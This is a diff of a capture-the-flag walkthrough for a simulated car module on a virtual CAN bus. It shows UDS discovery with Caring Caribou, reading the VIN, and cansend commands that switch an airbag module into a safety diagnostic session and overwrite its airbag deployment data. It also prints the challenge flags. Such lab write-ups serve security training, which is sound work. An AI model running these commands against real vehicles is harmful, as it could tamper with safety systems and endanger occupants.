@@ -1,65 +1,47 @@
+Perform an initial discovery with caring caribou $python3 cc.py uds discovery
 
-<b> Challenge: </b></br>
-[EASY] - 20 pts You have encountered a wild module with no home! It has a wiring harness, but it misses its vehicle. The first flag is to identify which car this module came from! Bonus points if you can tell me where it was manufactured.
+Discovery give us the following identified diagnostics:
 
-[HARD] - 100 pts One of the UDS servers on this module has security in place. Find the diagnostic ID and see if you can unlock it. The flag will be in this format: FLAG{...}
++------------+------------+ | CLIENT ID | SERVER ID | +------------+------------+ | 0x00000620 | 0x00000520 | | 0x00000622 | 0x00000522 | | 0x0000062c | 0x0000052c | | 0x000007e0 | 0x000007e8 | | 0x000007e2 | 0x000007ea | | 0x000007f1 | 0x000007f9 | +------------+------------+
 
-<b> Walkthrough: </b></br>
+Next we can look up available services for each of the available modules shown in the list above
 
-sudo ./uds-server vcan0
+As an example for this recon walkthrough we will follow up only on the last module from the list 0x7f1 and we perform a discovery of services
 
-cc.py uds discovery
+$python3 cc.py uds services 0x7f1 0x7f9
 
-![image](https://user-images.githubusercontent.com/47937620/234049005-82d56a83-7235-4bcc-b5e8-34cb723e4c00.png)
+Supported service 0x10: DIAGNOSTIC_SESSION_CONTROL Supported service 0x11: ECU_RESET Supported service 0x22: READ_DATA_BY_IDENTIFIER Supported service 0x27: SECURITY_ACCESS Supported service 0x2e: WRITE_DATA_BY_IDENTIFIER Supported service 0x3e: TESTER_PRESENT
 
-cc.py uds services 0x710 0x77a
+Next we can perform a discovery of subfunctions on 0x22 READ_DATA and also on 0x2e WRITE_DATA, the rest of the services are standard and respond as defined for UDS
 
-![image](https://user-images.githubusercontent.com/47937620/234050031-c17c9ba0-d15e-411d-8c17-556d4c8516f6.png)
+$python3 cc.py dcm subfunc 0x7f1 0x7f9 0x22 2 3 Sub-function 11 11 Sub-function f1 90 Sub-function fa 00 Sub-function fa 01 Sub-function fa 02 Sub-function fa 06
 
-cc.py uds services 0x780 0x786
+From the list above we can see the subfunctions FA 00 to FA 06 which are subfunctions reserved for Airbag Deployment Data (see reference below) https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/
 
-![image](https://user-images.githubusercontent.com/47937620/234052366-b2e80854-6595-45ab-840a-a579a65266df.png)
+Once we have a list of subfunctions we could read the data out and also we could write data in
 
-cc.py uds services 0x7df 0x77a
+Keeping in mind that this is an airbag module before reading or writing is permitted the diagnostic session should be raise from default session 0x01 to Safety system Diagnostic system session 0x04 $cansend vcan0 7f1#021004 50 04 00 FF 00 FF
 
-![image](https://user-images.githubusercontent.com/47937620/234061217-eb4783eb-1e24-4b6d-87b2-fe6bb51efba0.png)
+We get a positive response of the session changed and we can now execute a subfunction discovery on 0x2e WRITE_DATA service $python3 cc.py dcm subfunc 0x7f1 0x7f9 0x2e 2 3 Sub-function 11 11 Sub-function f1 90 Sub-function fa 00 Sub-function fa 01 Sub-function fa 02 Sub-function fa 06
 
-cc.py uds services 0x7e0 0x77a
+now let's read the VIN number as we already know the subfunction F1 90 has been identified as available as part of 0x22 service in a seperate terminal run the isotprecv command $isotprecv vcan0 -s 7f1 -d 7f9
 
-![image](https://user-images.githubusercontent.com/47937620/234061895-2da16588-f701-4014-a794-d7395c7ed684.png)
+$cansend vcan0 7f1#0322f190 response: 62 F1 90 01 31 46 4C 41 47 56 49 4E 53 52 53 34 32 30 36 39 30
 
+we convert the hex to ascii $echo "31464c414756494e535253343230363930" | xxd -r -p 1FLAGVINSRS420690
 
-In order to identify which vehicle this module came from we can request to read the VIN number by using the ReadDataByIdentifier request 0x22 and VIN request F190
+we should be able to read and write as well, let's try it with subfunction FA 06 we read it first $cansend vcan0 7f1#0322fa06 62 FA 06 01 01 01
 
-isotprecv -s 780 -d 786 vcan0
+Let's now try to write data $cansend vcan0 7f1#062efa06000000 6E FA 06
 
-cansend vcan0 780#0322F190
+and read it again to verify $cansend vcan0 7f1#0322fa06 62 FA 06 00 00 00
 
-Response: 62 F1 90 31 46 54 56 57 31 45 4C 37 4E 57 47 30 30 36 37
+Success
 
-Data:
-31 46 54 56 57 31 45 4C 37 4E 57 47 30 30 36 37
+![image](https://github.com/IvanGranero/car-hacking/assets/47937620/015899a5-38f1-46a2-bdb7-428555ff6f9f)
 
-By converting the hex to ascii we get:
-1FTVW1EL7NWG0067
+This walkthrough only traverses one of the many possible paths to do recon on the different modules and services available for a complete recon all the remaining modules and services within the modules plus subfuntions would have to be discovered and played with.
 
-With a quick search online we know now the vehicle and manufacturer:
-1  - North America
-FT - FORD
+Just to give another quick example if we do a service discovery on module 7e0: Supported service 0x01: Unknown service Supported service 0x04: Unknown service Supported service 0x09: Unknown service Supported service 0x10: DIAGNOSTIC_SESSION_CONTROL Supported service 0x11: ECU_RESET Supported service 0x22: READ_DATA_BY_IDENTIFIER Supported service 0x23: READ_MEMORY_BY_ADDRESS Supported service 0x27: SECURITY_ACCESS Supported service 0x28: COMMUNICATION_CONTROL Supported service 0x2e: WRITE_DATA_BY_IDENTIFIER Supported service 0x2f: INPUT_OUTPUT_CONTROL_BY_IDENTIFIER Supported service 0x3e: TESTER_PRESENT Supported service 0xba: Unknown service
 
-UDS Server 0x786 has security and place via 0x27 security access service identifier
-
-At this point we can try to brute force the seed and key which can take days however since we have the uds-server binary we can reverse engineer the firmware with ghidra
-
-![image](https://user-images.githubusercontent.com/47937620/234073927-17a2fad1-6f76-4374-833a-28557908ef63.png)
-
-Within function handle_abs_780 we are able to find not only the seed and key algorithm but also the FLAG:
-
-FLAG{THI5_ECu_15_pwN3d}
-
-
-
-
-
-
-
+with the above information we can either do a dump_dids o subfunction search, the 0x2f would be a very interesting service to play with. as a hint this module also contains a flag by reading the VIN. Have fun!
